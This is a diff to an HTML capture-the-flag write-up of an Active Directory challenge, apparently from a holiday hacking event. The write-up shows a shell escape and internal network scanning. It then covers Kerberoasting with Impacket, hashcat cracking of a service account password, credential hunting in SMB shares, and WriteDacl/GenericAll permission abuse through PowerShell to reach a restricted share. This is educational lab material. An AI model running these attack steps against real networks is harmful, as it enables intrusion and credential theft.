@@ -40,7 +40,6 @@
     <script src="static/jquery.js"></script>
     <script src="static/underscore.js"></script>
     <script src="static/doctools.js"></script>
-    <script src="static/language_data.js"></script>
     <script src="static/togglebutton.js"></script>
     <script src="static/clipboard.min.js"></script>
     <script src="static/copybutton.js"></script>
@@ -431,7 +430,7 @@
  </li>
  <li class="toc-h2 nav-item toc-entry">
   <a class="reference internal nav-link" href="#hashcat">
-   hashcat
+   Hashcat
   </a>
  </li>
  <li class="toc-h2 nav-item toc-entry">
@@ -441,7 +440,7 @@
  </li>
  <li class="toc-h2 nav-item toc-entry">
   <a class="reference internal nav-link" href="#powershell">
-   powershell
+   Powershell
   </a>
  </li>
  <li class="toc-h2 nav-item toc-entry">
@@ -475,26 +474,26 @@
 <p>Talk: <a class="reference external" href="https://www.youtube.com/watch?v=iMh8FTzepU4">https://www.youtube.com/watch?v=iMh8FTzepU4</a></p>
 <p><a class="reference external" href="https://register.elfu.org/register">(https://register.elfu.org/register)</a>
 <img alt="portal" src="images/elfu-portal.png" /></p>
-<p>we have to register in oder to get an account. The email you enter doesn’t matter
-so let’s register and get credentials.</p>
-<p>we connect in ssh on the server and we got stuck in a screen like this:
+<p>We have to register in order to get an account. The email you enter doesn’t matter
+so let’s register and get the ssh credentials.</p>
+<p>We connected in ssh on the server and we got stuck in a screen like this:
 <img alt="screensplash" src="images/elfu-screen.png" /></p>
-<p>looking at portal server we saw it was served by a Python backend, so to try to close the screensplash
-we just replied to the question: “how do you get out of a python program?”
+<p>Looking at portal server we saw it was served by a Python backend, so to try to close the screensplash
+we just replied to the question: “how do you get out of a python program?” <br>
 CTRL-D !!! and it worked :)</p>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>: Traceback (most recent call last):
-  File &quot;/opt/grading_system&quot;, line 41, in &lt;module&gt;
-    main()
-  File &quot;/opt/grading_system&quot;, line 26, in main
-    a = input(&quot;: &quot;).lower().strip()
-EOFError
-&gt;&gt;&gt; import os 
-&gt;&gt;&gt; os.system(&#39;/bin/bash&#39;)
-fbsjgeyymg@grades:~$ 
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">:</span> <span class="n">Traceback</span> <span class="p">(</span><span class="n">most</span> <span class="n">recent</span> <span class="n">call</span> <span class="n">last</span><span class="p">):</span>
+  <span class="n">File</span> <span class="s2">&quot;/opt/grading_system&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">41</span><span class="p">,</span> <span class="ow">in</span> <span class="o">&lt;</span><span class="n">module</span><span class="o">&gt;</span>
+    <span class="n">main</span><span class="p">()</span>
+  <span class="n">File</span> <span class="s2">&quot;/opt/grading_system&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">26</span><span class="p">,</span> <span class="ow">in</span> <span class="n">main</span>
+    <span class="n">a</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&quot;: &quot;</span><span class="p">)</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+<span class="ne">EOFError</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">os</span> 
+<span class="o">&gt;&gt;&gt;</span> <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;/bin/bash&#39;</span><span class="p">)</span>
+ 
 </pre></div>
 </div>
-<p>we gained a shell on the machine. ok .. the challenge can start ..</p>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>fbsjgeyymg@grades:~$ ls -la
+<p>We gained a shell on the machine. ok .. the challenge can start ..</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ls -la
 total 28
 drwxr-x--- 3 fbsjgeyymg fbsjgeyymg 4096 Dec 29 16:58 .
 drwxr-xr-x 1 root       root       4096 Dec 29 17:03 ..
@@ -506,9 +505,9 @@ drwx------ 2 fbsjgeyymg fbsjgeyymg 4096 Dec 29 16:58 .cache
 -rw-r--r-- 1 fbsjgeyymg fbsjgeyymg  807 Feb 25  2020 .profile
 </pre></div>
 </div>
-<p>nothing incredible here ..
-let’s look around in the network and get together some info gathering ..</p>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>bsjgeyymg@grades:~$ ip a
+<p>Nothing incredible here .. <br>
+Let’s look around in the network and get together some info gathering ..</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ip a
 1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
     inet 127.0.0.1/8 scope host lo
@@ -519,8 +518,8 @@ let’s look around in the network and get together some info gathering ..</p>
        valid_lft forever preferred_lft forever
 </pre></div>
 </div>
-<p>ok and there is a kindly nmap available, well</p>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ nmap 172.17.0.0/24
+<p>Ok and there is a kindly nmap available, well</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$nmap 172.17.0.0/24
 Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-29 17:26 UTC
 Nmap scan report for 172.17.0.1
 Host is up (0.00055s latency).
@@ -569,15 +568,15 @@ PORT     STATE SERVICE
 3269/tcp open  globalcatLDAPssl
 </pre></div>
 </div>
-<p>smbclient failed, it seems we cannot connect to the shares from here</p>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">smbclient</span> <span class="o">-</span><span class="n">L</span> <span class="mf">172.17.0.5</span> <span class="o">-</span><span class="n">p</span> <span class="mi">455</span>
-<span class="n">do_connect</span><span class="p">:</span> <span class="n">Connection</span> <span class="n">to</span> <span class="mf">172.17.0.5</span> <span class="n">failed</span> <span class="p">(</span><span class="n">Error</span> <span class="n">NT_STATUS_CONNECTION_REFUSED</span><span class="p">)</span>
+<p>smbclient failed, it seems we cannot connect to the shares from here.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$smbclient -L 172.17.0.5 -p 455
+do_connect: Connection to 172.17.0.5 failed (Error NT_STATUS_CONNECTION_REFUSED)
 </pre></div>
 </div>
 <div class="section" id="the-internal-network">
 <h2>the internal network<a class="headerlink" href="#the-internal-network" title="Permalink to this headline">¶</a></h2>
-<p>there are other networks then?</p>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ route -n 
+<p>There are other networks then?</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$route -n 
 Kernel IP routing table
 Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
 0.0.0.0         172.17.0.1      0.0.0.0         UG    0      0        0 eth0
@@ -587,10 +586,10 @@ Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
 172.17.0.0      0.0.0.0         255.255.0.0     U     0      0        0 eth0
 </pre></div>
 </div>
-<p>yep! We can reach 3 other internal networks from here.</p>
+<p>Yep! We can reach 3 other internal networks from here.</p>
 <div class="section" id="id1">
 <h3>10.128.1.0/24<a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h3>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ nmap 10.128.1.0/24 
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$nmap 10.128.1.0/24 
 Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-29 17:46 UTC
 Nmap scan report for hhc21-windows-linux-docker.c.holidayhack2021.internal (10.128.1.4)
 Host is up (0.0016s latency).
@@ -619,11 +618,11 @@ PORT     STATE SERVICE
 3389/tcp open  ms-wbt-server
 </pre></div>
 </div>
-<p>there is a Domain Controller on 10.128.1.53</p>
+<p>There is a Domain Controller on 10.128.1.53</p>
 </div>
 <div class="section" id="id2">
 <h3>10.128.2.0/24<a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h3>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ nmap 10.128.2.0/24 
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$nmap 10.128.2.0/24 
 long list of clients
 ...
 </pre></div>
@@ -631,8 +630,8 @@ long list of clients
 </div>
 <div class="section" id="id3">
 <h3>10.128.3.0/24<a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h3>
-<p>there is a really interesting server on the third network too</p>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ namp 10.128.3.30 -Pn
+<p>There is a really interesting server on the third network too</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$namp 10.128.3.30 -Pn
 Nmap scan report for 10.128.3.30
 Host is up (0.00080s latency).
 Not shown: 966 closed ports
@@ -679,7 +678,7 @@ PORT     STATE SERVICE
 <div class="section" id="rpcclient-info">
 <h2>rpcclient info<a class="headerlink" href="#rpcclient-info" title="Permalink to this headline">¶</a></h2>
 <p>Let’s gather together some more info by using <code class="docutils literal notranslate"><span class="pre">rpcclient</span></code></p>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ rpcclient 10.128.3.30
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$rpcclient 10.128.3.30
 Enter WORKGROUP\nrfcofddsg&#39;s password: 
 rpcclient $&gt; querydominfo
 Domain:		ELFU
@@ -703,7 +702,7 @@ name:[ELFU] idx:[0x0]
 name:[BUILTIN] idx:[0x1]
 </pre></div>
 </div>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>rpcclient 10.128.1.53
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$rpcclient 10.128.1.53
 Enter WORKGROUP\nrfcofddsg&#39;s password: 
 rpcclient $&gt; querydominfo
 Domain:		ELFU
@@ -727,9 +726,9 @@ rpcclient $&gt; srvinfo
 </div>
 <div class="section" id="smbclient">
 <h2>smbclient<a class="headerlink" href="#smbclient" title="Permalink to this headline">¶</a></h2>
-<p>In a Windows network first thing to look for are for sure the shares. From a linux box we can use the <code class="docutils literal notranslate"><span class="pre">smbclient</span></code> command to connect to windows shares
+<p>In a Windows network first thing to look for are for sure the shares. From a Linux box we can use the <code class="docutils literal notranslate"><span class="pre">smbclient</span></code> command to connect to windows shares
 on 10.128.3.30</p>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ smbclient -L 10.128.3.30 -p 445
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$smbclient -L 10.128.3.30 -p 445
 Enter WORKGROUP\fbsjgeyymg&#39;s password: 
 
 	Sharename       Type      Comment
@@ -747,12 +746,14 @@ SMB1 disabled -- no workgroup available
 </div>
 <div class="section" id="impacket">
 <h2>impacket<a class="headerlink" href="#impacket" title="Permalink to this headline">¶</a></h2>
-<p>we have some docs here to read:
-<a class="reference external" href="https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a">(Kerbero Cheatsheet)</a>
-<a class="reference external" href="https://github.com/SecureAuthCorp/impacket/blob/cd4fe47cfcb72d7d35237a99e3df95cedf96e94f/examples/GetUserSPNs.py">Impacket</a></p>
+<p>we have some docs here to read:</p>
+<ul class="simple">
+<li><p><a class="reference external" href="https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a">(Kerbero Cheatsheet)</a></p></li>
+<li><p><a class="reference external" href="https://github.com/SecureAuthCorp/impacket/blob/cd4fe47cfcb72d7d35237a99e3df95cedf96e94f/examples/GetUserSPNs.py">Impacket</a></p></li>
+</ul>
 <p>and we can use the script GetUserSPNs.py to find Service Principal Names that are associated with our user account
 and run it against the Domain Controller</p>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ python3 GetUserSPNs.py -outputfile output.txt -dc-ip 10.128.1.53 ELFU.local/dcvcskikmq:&#39;Gvogcgrrp@&#39; -request
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$python3 GetUserSPNs.py -outputfile output.txt -dc-ip 10.128.1.53 ELFU.local/dcvcskikmq:&#39;Gvogcgrrp@&#39; -request
 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 
 ServicePrincipalName                 Name      MemberOf  PasswordLastSet             LastLogon  Delegation 
@@ -768,7 +769,7 @@ ldap/elfu_svc.elfu.local/elfu.local  elfu_svc            2021-10-29 19:25:04.305
 Time to try to crack the hash.</p>
 </div>
 <div class="section" id="hashcat">
-<h2>hashcat<a class="headerlink" href="#hashcat" title="Permalink to this headline">¶</a></h2>
+<h2>Hashcat<a class="headerlink" href="#hashcat" title="Permalink to this headline">¶</a></h2>
 <p>taken from hints to build our hashcat rule:</p>
 <div class="admonition note">
 <p class="admonition-title">Note</p>
@@ -776,28 +777,28 @@ Time to try to crack the hash.</p>
 <p>From: Eve Snowshoes</p>
 <p><a class="reference external" href="https://github.com/NotSoSecure/password_cracking_rules">(OneRuleToRuleThemAll.rule)</a> is great for mangling when a password dictionary isn’t enough.</p>
 </div>
-<p>Password Cracking</p>
-<p>First we have to build up a password list. We use the awsome tool found in the hints <code class="docutils literal notranslate"><span class="pre">cewl</span></code> that is able to build a list
-of possible password extracted from a site just by  giving it the url.</p>
+<p>Now, time for some password cracking. <br>
+First we have to build up a password list. We use the awesome tool found in the hints, <code class="docutils literal notranslate"><span class="pre">cewl</span></code>, that is able to build a list
+of possible password extracted from a site just by giving it the url.</p>
 <div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$sudo apt-get install ruby
 git clone https://github.com/digininja/CeWL.git
 $sudo gem install nokogiri
 ./cewl.rb –with-numbers https://register.elfu.org/register &gt; ch8_dict.txt
 </pre></div>
 </div>
-<p>once we have the worldlist we like, then ….. we are ready to crack it!</p>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$hashcat64.exe -m 13100 -a 0 .\spns.txt -r rules\OneRuleToRuleThemAll.rule -o craccato.txt .\ch8_dict.txt -O
+<p>Once we have the worldlist we like, then ….. we are ready to crack it!</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$hashcat64.bin -m 13100 -a 0 .\spns.txt -r rules\OneRuleToRuleThemAll.rule -o craccato.txt .\ch8_dict.txt -O
 </pre></div>
 </div>
 <div class="highlight-default notranslate"><div class="highlight"><pre><span></span>OUTPUT:
 $krb5tgs$23$*elfu_svc$ELFU.LOCAL$ELFU.local/elfu_svc*$aa5230518cc7587d7f56d14450a8………90b4c278c73c4975a:Snow2021!
 </pre></div>
 </div>
-<p>so we know a share and we have a password .. let’s try it</p>
+<p>So we know a share and we have a password .. let’s try it</p>
 </div>
 <div class="section" id="smbclient-again">
 <h2>smbclient again<a class="headerlink" href="#smbclient-again" title="Permalink to this headline">¶</a></h2>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>iuwuvckfvi@grades:~$ smbclient  \\\\10.128.3.30\\elfu_svc_shr -U ELFU.local\\elfu_svc
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$smbclient  \\\\10.128.3.30\\elfu_svc_shr -U ELFU.local\\elfu_svc
 Enter ELFU.LOCAL\elfu_svc&#39;s password: 
 Try &quot;help&quot; to get a list of possible commands.
 smb: \&gt; dir
@@ -812,21 +813,21 @@ smb: \&gt; dir
   ......................
 </pre></div>
 </div>
-<p>there are a bunch of powershell scripts here.
-Try to get them on the linux box in order to grep them looking for some password or creds ..  (I love grep!!!!)
+<p>There are a bunch of powershell scripts here.
+Try to get them on the Linux box in order to grep them looking for some password or creds ..  (I love grep!!!!)
 <br>An interesting feature of smbclient <a class="reference external" href="https://www.samba.org/samba/docs/current/man-html/smbclient.1.html">(found in samba docs)</a>
-is the tar option, allowing us to download in a tar all the files.</p>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>iuwuvckfvi@grades:~/$ mkdir test &amp;&amp; cd test
-iuwuvckfvi@grades:~/test$ smbclient \\\\10.128.3.30\\elfu_svc_shr -U ELFU.local\\elfu_svc -Tc ./test.tar *
+is the tar option, allowing us to download in a single tar all the files.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$mkdir test &amp;&amp; cd test
+$smbclient \\\\10.128.3.30\\elfu_svc_shr -U ELFU.local\\elfu_svc -Tc ./test.tar *
 </pre></div>
 </div>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>iuwuvckfvi@grades:~/test$ ls -l 
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ls -l 
 total 1320
 -rw-rw---- 1 iuwuvckfvi iuwuvckfvi 1348096 Dec 29 22:27 test.tar
 </pre></div>
 </div>
-<p>extract files from the tar archive</p>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>iuwuvckfvi@grades:~/test$ tar  -xvf test.tar 
+<p>Extract files from the tar archive.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$tar -xvf test.tar 
 ./Get-NavArtifactUrl.ps1
 ./Get-WorkingDirectory.ps1
 ./Stop-EtwTraceCapture.ps1
@@ -834,11 +835,11 @@ total 1320
 ........
 </pre></div>
 </div>
-<p>searching “SecureString” with grep ..</p>
+<p>Searching “SecureString” with grep ..</p>
 <div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$grep SecureString *ps1
 </pre></div>
 </div>
-<p>nothing useful except the pass to get a letsencrypt certificate .. retry with</p>
+<p>Nothing useful except the pass to get a letsencrypt certificate .. retry with</p>
 <div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$grep -i passw *ps1 
 </pre></div>
 </div>
@@ -851,9 +852,9 @@ total 1320
 </div>
 </div>
 <div class="section" id="powershell">
-<h2>powershell<a class="headerlink" href="#powershell" title="Permalink to this headline">¶</a></h2>
-<p>let’s run it in the powershell</p>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>iuwuvckfvi@grades:~/test$ powershell 
+<h2>Powershell<a class="headerlink" href="#powershell" title="Permalink to this headline">¶</a></h2>
+<p>Let’s run it in the powershell</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$powershell 
 PowerShell 7.2.0-rc.1
 Copyright (c) Microsoft Corporation.
 
@@ -887,12 +888,12 @@ Enter-PSSession -ComputerName 10.128.1.53 -Credential $aCred -Authentication Neg
 </div>
 <div class="section" id="ldapdomaindump">
 <h2>ldapdomaindump<a class="headerlink" href="#ldapdomaindump" title="Permalink to this headline">¶</a></h2>
-<p>To get a better understanding of the global situation, we used <a class="reference external" href="https://github.com/dirkjanm/ldapdomaindump"><strong>ldapdomaindump</strong></a>, a tool that gives us a lot of informations about the Active Directory we are interested in using LDAP. We used <em>elfu_svc</em> account. It is already installed on the remote linux installation.</p>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>ldapdomaindump  -u elfu.local\\elfu_svc -p Snow2021! 10.128.1.53
+<p>To get a better understanding of the global situation, we used <a class="reference external" href="https://github.com/dirkjanm/ldapdomaindump"><strong>ldapdomaindump</strong></a>, a tool that gives us a lot of informations about the Active Directory we are interested in using LDAP. We used <em>elfu_svc</em> account. It is already installed on the remote Linux installation.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ldapdomaindump  -u elfu.local\\elfu_svc -p Snow2021! 10.128.1.53
 </pre></div>
 </div>
 <p>This outputs a series of files. We grabbed the .html files and opened them on our computers.<br />
-You can get them here: <span class="xref myst">ch8_domain_users.html</span>, <span class="xref myst">ch8_domain_groups.html</span>, <span class="xref myst">ch8_domain_computers.html</span></p>
+You can get a sample of them here: <span class="xref myst">ch8_domain_users.html</span>, <span class="xref myst">ch8_domain_groups.html</span>, <span class="xref myst">ch8_domain_computers.html</span></p>
 <p><img alt="(LDAPDomainDump output)" src="images/ADDumpFiles.png" /></p>
 <p>In <strong>domain_groups.html</strong> we can see some groups that may be useful to us, like <em>Domain Admins</em> and <em>Research Department</em>. Let’s see what we can do to them. We could use one of the <a class="reference external" href="https://github.com/chrisjd20/hhc21_powershell_snippets/blob/main/README.md">scripts</a> provided to us by Chris Davis in his <a class="reference external" href="https://www.youtube.com/watch?v=iMh8FTzepU4">talk</a>.<br />
 You could use the first script in the page, changing some values to match with our environment.</p>
@@ -928,7 +929,7 @@ $ADSI.psbase.ObjectSecurity.GetAccessRules($true,$true,[Security.Principal.NTAcc
 <span class="n">PropagationFlags</span>      <span class="p">:</span> <span class="kc">None</span>
 </pre></div>
 </div>
-<p>Seems like the user “<strong>remote_elf</strong>” has the <strong>WriteDacl</strong> permission, which allows us to add/remove permissions for other users for this group. We can now proceed to use the second script provided to us to by Chris Devis.</p>
+<p>Seems like the user “<strong>remote_elf</strong>” has the <strong>WriteDacl</strong> permission, which allows us to add/remove permissions for other users for this group. We can now proceed to use the second script provided to us to by Chris Davis.</p>
 <div class="admonition note">
 <p class="admonition-title">Note</p>
 <p>This script adds the <strong>GenericAll</strong> permission to a user of our choice. We should add it to the user generated by us.</p>
@@ -991,19 +992,19 @@ PropagationFlags      : None
 </div>
 <div class="section" id="santa-pdf-finally">
 <h2>Santa PDF finally!<a class="headerlink" href="#santa-pdf-finally" title="Permalink to this headline">¶</a></h2>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">smbclient</span> \\\\<span class="mf">10.128.3.30</span>\\<span class="n">research_dep</span> <span class="o">-</span><span class="n">U</span> <span class="n">ELFU</span><span class="o">.</span><span class="n">local</span>\\<span class="n">iqulelyrfv</span>
-<span class="o">==&gt;</span> <span class="n">Enter</span> <span class="n">Password</span>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$smbclient \\\\10.128.3.30\\research_dep -U ELFU.local\\iqulelyrfv
+==&gt; Enter Password
 
-<span class="n">smb</span><span class="p">:</span> \<span class="o">&gt;</span> <span class="nb">dir</span>
-  <span class="o">.</span>                                   <span class="n">D</span>        <span class="mi">0</span>  <span class="n">Thu</span> <span class="n">Dec</span>  <span class="mi">2</span> <span class="mi">16</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">42</span> <span class="mi">2021</span>
-  <span class="o">..</span>                                  <span class="n">D</span>        <span class="mi">0</span>  <span class="n">Thu</span> <span class="n">Dec</span> <span class="mi">30</span> <span class="mi">08</span><span class="p">:</span><span class="mi">01</span><span class="p">:</span><span class="mi">24</span> <span class="mi">2021</span>
-  <span class="n">SantaSecretToAWonderfulHolidaySeason</span><span class="o">.</span><span class="n">pdf</span>      <span class="n">N</span>   <span class="mi">173932</span>  <span class="n">Thu</span> <span class="n">Dec</span>  <span class="mi">2</span> <span class="mi">16</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="mi">26</span> <span class="mi">2021</span>
+smb: \&gt; dir
+  .                                   D        0  Thu Dec  2 16:39:42 2021
+  ..                                  D        0  Thu Dec 30 08:01:24 2021
+  SantaSecretToAWonderfulHolidaySeason.pdf      N   173932  Thu Dec  2 16:38:26 2021
 
-                <span class="mi">41089256</span> <span class="n">blocks</span> <span class="n">of</span> <span class="n">size</span> <span class="mf">1024.</span> <span class="mi">34704268</span> <span class="n">blocks</span> <span class="n">available</span>
+                41089256 blocks of size 1024. 34704268 blocks available
 
-<span class="n">smb</span><span class="p">:</span> \<span class="o">&gt;</span> <span class="n">get</span> <span class="n">SantaSecretToAWonderfulHolidaySeason</span><span class="o">.</span><span class="n">pdf</span>
-<span class="n">getting</span> <span class="n">file</span> \<span class="n">SantaSecretToAWonderfulHolidaySeason</span><span class="o">.</span><span class="n">pdf</span> <span class="n">of</span> <span class="n">size</span> <span class="mi">173932</span> <span class="k">as</span> <span class="n">SantaSecretToAWonderfulHolidaySeason</span><span class="o">.</span><span class="n">pdf</span>
-<span class="n">smb</span><span class="p">:</span> \<span class="o">&gt;</span> <span class="n">exit</span>
+smb: \&gt; get SantaSecretToAWonderfulHolidaySeason.pdf
+getting file \SantaSecretToAWonderfulHolidaySeason.pdf of size 173932 as SantaSecretToAWonderfulHolidaySeason.pdf
+smb: \&gt; exit
 </pre></div>
 </div>
 <p>We have downloaded the file that we probably needed to access, <strong>SantaSecretToAWonderfulHolidaySeason.pdf</strong><br />
